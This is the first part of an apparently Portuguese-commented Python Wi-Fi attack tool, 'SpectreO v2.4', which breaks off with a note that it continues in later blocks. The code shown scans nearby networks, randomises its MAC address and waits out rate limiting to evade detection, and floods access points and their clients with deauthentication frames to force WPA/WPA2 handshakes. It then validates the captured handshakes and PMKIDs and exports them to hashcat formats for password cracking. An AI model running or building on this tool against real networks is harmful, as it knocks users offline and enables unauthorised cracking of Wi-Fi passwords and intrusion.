#!/usr/bin/env python3
"""
SpectreO v2.4 FINAL - Production Grade

Hardware target: Aspire 3 15 (8GB RAM, 100GB disco)

Correções v2.4:
✓ Evil Twin com validação hostapd
✓ Safe sendp wrapper (interface disconnect)
✓ Channel monitoring (AP hop detection)
✓ Race condition Evil Twin eliminada
✓ Batch com meta de capturas
✓ Cores com rich library
✓ Progress tracking
✓ Error recovery completo

Otimizações para 8GB RAM:
- rdpcap() seguro (RAM suficiente)
- Compressão opcional
- Cache inteligente
"""

import os
import sys
import time
import json
import gzip
import random
import subprocess
import threading
from scapy.all import *
from collections import defaultdict
from datetime import datetime

# Rich para cores e progress
try:
    from rich.console import Console
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.panel import Panel
    from rich.table import Table
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False
    console = None

# ============================================================================
# CONFIGURAÇÃO
# ============================================================================

CONFIG = {
    'interface': 'wlan0',
    'output_dir': 'captures',
    'compress': True,
    'skip_captured': True,
    'optimize_live': True,
    'scan_duration': 30,
    'max_capture_attempts': 5,
    'capture_timeout': 30,
    'batch_mode': False,
    'batch_max_targets': 20,
    'batch_min_clients': 0,
    'batch_min_signal': -80,
    'batch_target_captures': None,  # NOVO: None = sem limite
    'mac_rotation': True,
    'timing_randomization': True,
    'detect_countermeasures': True,
    'auto_export_hashcat': True,
    'aggressive_deauth': True,
    'verbose': True,
    'monitor_channel_changes': True  # NOVO: Monitora mudanças de canal
}

# ============================================================================
# LOGGER COM CORES
# ============================================================================

class ColoredLogger:
    """Logger com suporte a cores via rich"""
    
    @staticmethod
    def debug(msg):
        if CONFIG['verbose']:
            timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
            if RICH_AVAILABLE:
                console.print(f"[dim cyan][DEBUG] {timestamp}[/dim cyan] [dim]{msg}[/dim]")
            else:
                print(f"[DEBUG] {timestamp} | {msg}")
    
    @staticmethod
    def info(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[blue][INFO][/blue]  {timestamp} | {msg}")
        else:
            print(f"[INFO]  {timestamp} | {msg}")
    
    @staticmethod
    def success(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[bold green][+++][/bold green]   {timestamp} | {msg}")
        else:
            print(f"[+++]   {timestamp} | {msg}")
    
    @staticmethod
    def warning(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[bold yellow][!][/bold yellow]     {timestamp} | {msg}")
        else:
            print(f"[!]     {timestamp} | {msg}")
    
    @staticmethod
    def error(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[bold red][-][/bold red]     {timestamp} | {msg}")
        else:
            print(f"[-]     {timestamp} | {msg}")

log = ColoredLogger()

# ============================================================================
# SAFE NETWORK OPERATIONS
# ============================================================================

class SafeNetOps:
    """NOVO: Wrapper seguro para operações de rede"""
    
    @staticmethod
    def safe_sendp(packet, iface, **kwargs):
        """Sendp com error handling"""
        try:
            sendp(packet, iface=iface, **kwargs)
            return True
        except OSError as e:
            if 'No such device' in str(e) or 'Network is down' in str(e):
                log.error(f"Interface {iface} offline ou desconectada!")
                log.warning("Verifique se adaptador USB foi desconectado")
                return False
            else:
                log.error(f"Erro ao enviar pacote: {e}")
                return False
        except Exception as e:
            log.error(f"Erro inesperado: {e}")
            return False
    
    @staticmethod
    def check_interface_exists(interface):
        """Verifica se interface existe"""
        try:
            result = subprocess.run(['ip', 'link', 'show', interface],
                                   capture_output=True, stderr=subprocess.DEVNULL)
            return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def get_current_channel(interface):
        """Obtém canal atual da interface"""
        try:
            result = subprocess.run(['iw', interface, 'info'],
                                   capture_output=True, text=True, timeout=2)
            
            for line in result.stdout.split('\n'):
                if 'channel' in line.lower():
                    # Extrai número do canal
                    parts = line.split()
                    for i, part in enumerate(parts):
                        if part.isdigit() and 1 <= int(part) <= 14:
                            return int(part)
            return None
        except:
            return None

# ============================================================================
# CHANNEL MONITOR
# ============================================================================

class ChannelMonitor:
    """NOVO: Monitora mudanças de canal do AP"""
    
    def __init__(self, bssid, initial_channel, interface):
        self.bssid = bssid
        self.current_channel = initial_channel
        self.interface = interface
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        self.channel_changed = False
    
    def start(self):
        """Inicia thread de monitoramento"""
        self.thread = threading.Thread(target=self._monitor, daemon=True)
        self.thread.start()
        log.debug(f"Channel monitor iniciado para {self.bssid}")
    
    def stop(self):
        """Para monitoramento"""
        self.stop_event.set()
        if hasattr(self, 'thread'):
            self.thread.join(timeout=2)
    
    def get_channel(self):
        """Retorna canal atual"""
        with self.lock:
            return self.current_channel
    
    def _monitor(self):
        """Thread que monitora beacons do AP"""
        def handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                if pkt[Dot11].addr2 == self.bssid:
                    try:
                        channel = int(ord(pkt[Dot11Elt:3].info))
                        with self.lock:
                            if channel != self.current_channel:
                                log.warning(f"AP mudou canal {self.current_channel} → {channel}")
                                self.current_channel = channel
                                self.channel_changed = True
                    except:
                        pass
        
        # Sniff apenas beacons por 60s (depois assume canal estável)
        sniff(iface=self.interface, prn=handler, timeout=60, 
              stop_filter=lambda x: self.stop_event.is_set(), store=False)

# ============================================================================
# CAPTURE STATE (Thread-Safe)
# ============================================================================

class CaptureState:
    """NOVO: Estado thread-safe para capturas"""
    
    def __init__(self):
        self.packets = []
        self.captured = False
        self.lock = threading.Lock()
    
    def add_packet(self, pkt):
        """Adiciona pacote (thread-safe)"""
        with self.lock:
            self.packets.append(pkt)
    
    def get_packets(self):
        """Retorna cópia dos pacotes"""
        with self.lock:
            return self.packets.copy()
    
    def set_captured(self, value):
        """Define status capturado"""
        with self.lock:
            self.captured = value
    
    def is_captured(self):
        """Verifica se capturado"""
        with self.lock:
            return self.captured
    
    def packet_count(self):
        """Conta pacotes"""
        with self.lock:
            return len(self.packets)

# ============================================================================
# GERENCIADOR
# ============================================================================

class CaptureManager:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.cap_dir = os.path.join(output_dir, 'cap_files')
        self.hashcat_dir = os.path.join(output_dir, 'hashcat_files')
        self.metadata_file = os.path.join(output_dir, 'captures.json')
        self.captured = self.load_metadata()
        
        os.makedirs(self.cap_dir, exist_ok=True)
        os.makedirs(self.hashcat_dir, exist_ok=True)
        
        log.info(f"Estrutura: {output_dir}/")
        log.debug(f"  ├─ captures.json")
        log.debug(f"  ├─ cap_files/")
        log.debug(f"  └─ hashcat_files/")
    
    def load_metadata(self):
        if os.path.exists(self.metadata_file):
            try:
                with open(self.metadata_file, 'r') as f:
                    data = json.load(f)
                    log.debug(f"Metadata: {len(data)} capturas")
                    return data
            except Exception as e:
                log.error(f"Erro metadata: {e}")
                return {}
        return {}
    
    def save_metadata(self):
        try:
            with open(self.metadata_file, 'w') as f:
                json.dump(self.captured, f, indent=2, sort_keys=True)
            log.debug("Metadata salvo")
        except Exception as e:
            log.error(f"Erro salvar: {e}")
    
    def is_captured(self, bssid):
        return bssid in self.captured
    
    def add_capture(self, bssid, ssid, attack_type, cap_file, hc_file, channel, signal, validation=None):
        self.captured[bssid] = {
            'ssid': ssid,
            'attack_type': attack_type,
            'cap_file': cap_file,
            'hashcat_file': hc_file if hc_file else None,
            'channel': channel,
            'signal': signal,
            'timestamp': datetime.now().isoformat(),
            'validation': validation if validation else {}
        }
        self.save_metadata()
        log.success("Captura registrada")

class CaptureValidator:
    @staticmethod
    def validate_handshake(packets):
        log.debug(f"Validando {len(packets)} pacotes")
        eapol_frames = [pkt for pkt in packets if pkt.haslayer(EAPOL)]
        log.debug(f"{len(eapol_frames)} frames EAPOL")
        
        if len(eapol_frames) < 4:
            return False, f"Apenas {len(eapol_frames)}/4"
        
        has_msg1 = has_msg2 = False
        anonce = snonce = mic = None
        
        for i, pkt in enumerate(eapol_frames):
            try:
                raw = bytes(pkt[EAPOL])
                if len(raw) < 99:
                    continue
                
                current_anonce = raw[17:49]
                current_snonce = raw[49:81] if len(raw) > 81 else None
                current_mic = raw[81:97] if len(raw) > 96 else None
                
                if current_anonce != b'\x00' * 32 and (not current_snonce or current_snonce == b'\x00' * 32):
                    has_msg1 = True
                    anonce = current_anonce
                    log.debug(f"Msg1: ANonce={anonce.hex()[:16]}...")
                
                if current_snonce and current_snonce != b'\x00' * 32 and current_mic:
                    has_msg2 = True
                    snonce = current_snonce
                    mic = current_mic
                    log.debug(f"Msg2: SNonce={snonce.hex()[:16]}...")
            except Exception as e:
                log.debug(f"Erro frame {i+1}: {e}")
                continue
        
        if not (has_msg1 and has_msg2):
            return False, "Messages ausentes"
        if not anonce or anonce == b'\x00' * 32:
            return False, "ANonce inválido"
        if not snonce or snonce == b'\x00' * 32:
            return False, "SNonce inválido"
        if not mic or mic == b'\x00' * 16:
            return False, "MIC inválido"
        
        log.debug("Handshake válido!")
        return True, {
            'anonce': anonce.hex()[:32],
            'snonce': snonce.hex()[:32],
            'mic': mic.hex()[:32],
            'frames': len(eapol_frames)
        }
    
    @staticmethod
    def validate_pmkid(packets):
        log.debug(f"Validando PMKID: {len(packets)} pkts")
        if not packets:
            return False, "Vazio"
        for pkt in packets:
            if pkt.haslayer(EAPOL):
                try:
                    raw = bytes(pkt[EAPOL])
                    if b'\xdd' in raw:
                        idx = raw.find(b'\xdd')
                        if len(raw) >= idx + 22:
                            pmkid = raw[idx+2:idx+18]
                            if pmkid != b'\x00' * 16:
                                log.debug(f"PMKID: {pmkid.hex()}")
                                return True, {'pmkid': pmkid.hex()}
                except:
                    pass
        return False, "Não encontrado"

class CountermeasureDetector:
    def __init__(self):
        self.deauth_times = []
        self.blocked = False
    
    def record_deauth(self):
        self.deauth_times.append(time.time())
        cutoff = time.time() - 60
        self.deauth_times = [t for t in self.deauth_times if t > cutoff]
        log.debug(f"Deauth count 60s: {len(self.deauth_times)}")
    
    def check_rate_limit(self):
        if len(self.deauth_times) > 150:
            log.warning("Rate limiting!")
            self.blocked = True
            return True
        return False
    
    def is_blocked(self):
        return self.blocked
    
    def reset(self):
        self.deauth_times = []
        self.blocked = False
        log.debug("Detector resetado")

# ============================================================================
# UTILS CORRIGIDOS
# ============================================================================

def export_to_hashcat(cap_file, attack_type, manager):
    if not CONFIG['auto_export_hashcat']:
        return None
    
    log.debug(f"Export {attack_type}: {cap_file}")
    
    try:
        basename = os.path.basename(cap_file).replace('.cap.gz', '').replace('.cap', '')
        
        if attack_type == 'handshake':
            output = os.path.join(manager.hashcat_dir, f"{basename}.hc22000")
            result = subprocess.run(['hcxpcapngtool', '-o', output, cap_file],
                                   capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0 and os.path.exists(output):
                log.success(f"Export: {output}")
                return output
            else:
                log.warning(f"hcxpcapngtool código {result.returncode}")
        
        elif attack_type == 'pmkid':
            output = os.path.join(manager.hashcat_dir, f"{basename}.hc16800")
            result = subprocess.run(['hcxpcapngtool', '-o', output, cap_file],
                                   capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0 and os.path.exists(output):
                log.success(f"Export: {output}")
                return output
    
    except FileNotFoundError:
        log.warning("hcxpcapngtool não encontrado")
    except subprocess.TimeoutExpired:
        log.warning("hcxpcapngtool timeout")
    except Exception as e:
        log.error(f"Erro export: {e}")
    
    return None

def rotate_mac(interface):
    if not CONFIG['mac_rotation']:
        return None
    
    new_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
    log.debug(f"Rotacionando MAC: {new_mac}")
    
    try:
        subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                      check=True, timeout=5,
                      stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        
        subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                      check=True, timeout=5,
                      stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        
        subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                      check=True, timeout=5,
                      stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        
        log.info(f"MAC: {new_mac}")
        return new_mac
    
    except subprocess.CalledProcessError as e:
        log.error(f"Falha MAC: {e}")
        
        try:
            log.warning("Recuperando interface...")
            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                          timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            log.info("Interface recuperada")
        except:
            log.error("CRÍTICO: Interface offline!")
        
        return None
    
    except subprocess.TimeoutExpired:
        log.error("Timeout MAC")
        return None

def optimize_system():
    if not CONFIG['optimize_live']:
        return
    
    log.info("Otimizando...")
    
    subprocess.run(['sysctl', '-w', 'vm.swappiness=0'], 
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['sync'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    for svc in ['NetworkManager', 'wpa_supplicant']:
        subprocess.run(['systemctl', 'stop', svc], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    try:
        os.nice(-20)
    except:
        pass
    
    log.success("Sistema otimizado")

def setup_interface(interface):
    log.info(f"Setup {interface}...")
    
    subprocess.run(['airmon-ng', 'check', 'kill'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    new_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
    
    subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'monitor', 'control'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'txpower', 'fixed', '30'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'power_save', 'off'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    log.success(f"Interface OK (MAC: {new_mac})")

def set_channel(interface, channel):
    log.debug(f"Canal {channel}")
    subprocess.run(['iw', interface, 'set', 'channel', str(channel)], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def scan(interface, duration=30):
    networks = {}
    clients = defaultdict(list)
    traffic = defaultdict(int)
    
    log.info(f"Scan {duration}s...")
    
    if RICH_AVAILABLE:
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as progress:
            task = progress.add_task(f"Scanning...", total=duration)
            
            def handler(pkt):
                if pkt.haslayer(Dot11Beacon):
                    bssid = pkt[Dot11].addr2
                    try:
                        ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                        channel = int(ord(pkt[Dot11Elt:3].info))
                        stats = pkt[Dot11Beacon].network_stats()
                        crypto = stats.get('crypto', set())
                        signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -100
                        
                        if bssid not in networks:
                            networks[bssid] = {
                                'ssid': ssid if ssid else '<HIDDEN>',
                                'channel': channel,
                                'signal': signal,
                                'crypto': crypto
                            }
                            progress.update(task, description=f"[cyan]Scan: {len(networks)} redes[/cyan]")
                    except:
                        pass
                
                elif pkt.haslayer(Dot11) and pkt.type == 2:
                    for bssid in list(networks.keys()):
                        if pkt.addr1 == bssid or pkt.addr2 == bssid:
                            client = pkt.addr2 if pkt.addr1 == bssid else pkt.addr1
                            if client != bssid and client not in clients[bssid]:
                                clients[bssid].append(client)
                            traffic[bssid] += 1
            
            stop = threading.Event()
            
            def hop():
                channels = list(range(1, 14))
                elapsed = 0
                while not stop.is_set() and elapsed < duration:
                    for ch in channels:
                        if stop.is_set():
                            break
                        set_channel(interface, ch)
                        time.sleep(0.15)
                        elapsed += 0.15
                        progress.update(task, completed=int(elapsed))
            
            hopper = threading.Thread(target=hop, daemon=True)
            hopper.start()
            
            sniff(iface=interface, prn=handler, timeout=duration, store=False)
            
            stop.set()
            hopper.join()
    else:
        # Fallback sem rich
        def handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr2
                try:
                    ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                    channel = int(ord(pkt[Dot11Elt:3].info))
                    stats = pkt[Dot11Beacon].network_stats()
                    crypto = stats.get('crypto', set())
                    signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -100
                    
                    if bssid not in networks:
                        networks[bssid] = {
                            'ssid': ssid if ssid else '<HIDDEN>',
                            'channel': channel,
                            'signal': signal,
                            'crypto': crypto
                        }
                except:
                    pass
            
            elif pkt.haslayer(Dot11) and pkt.type == 2:
                for bssid in list(networks.keys()):
                    if pkt.addr1 == bssid or pkt.addr2 == bssid:
                        client = pkt.addr2 if pkt.addr1 == bssid else pkt.addr1
                        if client != bssid and client not in clients[bssid]:
                            clients[bssid].append(client)
                        traffic[bssid] += 1
        
        stop = threading.Event()
        
        def hop():
            channels = list(range(1, 14))
            while not stop.is_set():
                for ch in channels:
                    if stop.is_set():
                        break
                    set_channel(interface, ch)
                    time.sleep(0.15)
        
        hopper = threading.Thread(target=hop, daemon=True)
        hopper.start()
        
        sniff(iface=interface, prn=handler, timeout=duration, store=False)
        
        stop.set()
        hopper.join()
    
    for bssid in networks:
        networks[bssid]['clients'] = clients.get(bssid, [])
        networks[bssid]['traffic'] = traffic.get(bssid, 0)
    
    log.success(f"Scan: {len(networks)} redes")
    return networks

# ============================================================================
# ATAQUE 1: HANDSHAKE CORRIGIDO COMPLETO
# ============================================================================

def attack_handshake(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 1: Handshake WPA/WPA2")
    log.info("="*70)
    log.info(f"Alvo: {target['ssid']} ({target['bssid']})")
    log.info(f"Canal: {target['channel']} | Clientes: {len(target['clients'])}")
    
    # Verifica interface
    if not SafeNetOps.check_interface_exists(interface):
        log.error(f"Interface {interface} não existe!")
        return False
    
    if CONFIG['mac_rotation']:
        rotate_mac(interface)
        time.sleep(1)
    
    set_channel(interface, target['channel'])
    time.sleep(1)
    
    # NOVO: Inicia channel monitor
    channel_monitor = None
    if CONFIG['monitor_channel_changes']:
        channel_monitor = ChannelMonitor(target['bssid'], target['channel'], interface)
        channel_monitor.start()
    
    for attempt in range(1, CONFIG['max_capture_attempts'] + 1):
        log.info(f"Tentativa {attempt}/{CONFIG['max_capture_attempts']}")
        
        if CONFIG['detect_countermeasures'] and detector.check_rate_limit():
            log.warning("Aguardando 60s...")
            time.sleep(60)
            rotate_mac(interface)
            detector.reset()
        
        # NOVO: CaptureState thread-safe
        state = CaptureState()
        
        def handler(pkt):
            if pkt.haslayer(EAPOL):
                if pkt[Dot11].addr3 == target['bssid'] or pkt[Dot11].addr2 == target['bssid']:
                    state.add_packet(pkt)
                    count = state.packet_count()
                    print(f"    [EAPOL] Frame {count}", end='\r')
                    
                    if count >= 4:
                        valid, result = CaptureValidator.validate_handshake(state.get_packets())
                        if valid:
                            log.success("Handshake VALIDADO!")
                            state.set_captured(True)
                            return True
        
        done = threading.Event()
        
        def sniff_thread():
            log.debug(f"Sniffer: {CONFIG['capture_timeout']}s")
            sniff(iface=interface, prn=handler, timeout=CONFIG['capture_timeout'], 
                  stop_filter=lambda x: state.is_captured(), store=False)
            done.set()
        
        sniffer = threading.Thread(target=sniff_thread, daemon=True)
        sniffer.start()
        
        time.sleep(1)
        
        # Deauth
        inter = random.uniform(0.03, 0.10) if CONFIG['timing_randomization'] else 0.05
        rounds = 7 if CONFIG['aggressive_deauth'] else 3
        count = 40 if CONFIG['aggressive_deauth'] else 20
        
        log.info(f"Deauth: {count}x{rounds}, {inter:.3f}s")
        
        for round_num in range(1, rounds + 1):
            # NOVO: Checa mudança de canal
            if channel_monitor:
                current_ch = channel_monitor.get_channel()
                if current_ch != target['channel']:
                    log.warning(f"AP mudou para canal {current_ch}, ajustando...")
                    set_channel(interface, current_ch)
                    target['channel'] = current_ch
            
            frame = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target['bssid'], 
                                    addr3=target['bssid'])/Dot11Deauth(reason=7)
            
            # NOVO: safe_sendp
            if not SafeNetOps.safe_sendp(frame, interface, count=count, inter=inter, verbose=0):
                log.error("Falha ao enviar deauth - interface offline?")
                break
            
            detector.record_deauth()
            
            if target['clients']:
                for i, client in enumerate(target['clients'][:5], 1):
                    f1 = RadioTap()/Dot11(addr1=client, addr2=target['bssid'], 
                                         addr3=target['bssid'])/Dot11Deauth(reason=7)
                    f2 = RadioTap()/Dot11(addr1=target['bssid'], addr2=client, 
                                         addr3=target['bssid'])/Dot11Deauth(reason=7)
                    SafeNetOps.safe_sendp([f1, f2], interface, count=count//2, inter=inter, verbose=0)
                    detector.record_deauth()
            
            delay = random.uniform(0.2, 0.5) if CONFIG['timing_randomization'] else 0.3
            time.sleep(delay)
        
        done.wait()
        
        if state.is_captured():
            valid, result = CaptureValidator.validate_handshake(state.get_packets())
            
            if valid:
                filename_base = f"hs_{target['bssid'].replace(':', '')}_{target['ssid'].replace(' ', '_')[:15]}"
                
                if CONFIG['compress']:
                    cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap.gz")
                    with gzip.open(cap_file, 'wb') as f:
                        wrpcap(f, state.get_packets())
                else:
                    cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap")
                    wrpcap(cap_file, state.get_packets())
                
                hc_file = export_to_hashcat(cap_file, 'handshake', manager)
                
                manager.add_capture(target['bssid'], target['ssid'], 'handshake',
                                   cap_file, hc_file, target['channel'], target['signal'], result)
                
                log.success("HANDSHAKE CAPTURADO")
                log.info(f"CAP: {cap_file}")
                if hc_file:
                    log.info(f"HC: {hc_file}")
                
                # Para channel monitor
                if channel_monitor:
                    channel_monitor.stop()
                
                return True
        
        if attempt < CONFIG['max_capture_attempts']:
            time.sleep(3)
    
    if channel_monitor:
        channel_monitor.stop()
    
    log.error("Falhou")
    return False

# Continuo nos próximos blocos para não exceder limite...
